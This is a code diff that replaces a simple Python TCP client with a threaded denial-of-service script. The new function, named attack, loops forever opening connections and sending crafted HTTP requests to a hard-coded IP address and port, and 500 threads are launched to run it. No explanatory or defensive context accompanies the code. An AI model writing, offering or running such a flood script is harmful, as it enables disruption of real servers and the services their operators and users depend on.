@@ -1,24 +1,18 @@
 import socket
+import threading
 
-# Set the server IP address and port number
-server_ip = '185.107.194.87'
-server_port = 60184
+target = '185.107.194.87'
+port = 60184
+fake_ip = '185.107.194.87'
 
-# Create a TCP socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
 
-# Connect to the server
-sock.connect((server_ip, server_port))
-
-# Send data to the server (replace with your own data)
-data = b'Hello, server!'
-sock.sendall(data)
-
-# Receive data from the server
-response = sock.recv(1024)
-
-# Close the connection
-sock.close()
-
-# Print the response from the server
-print('Received:', response)
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
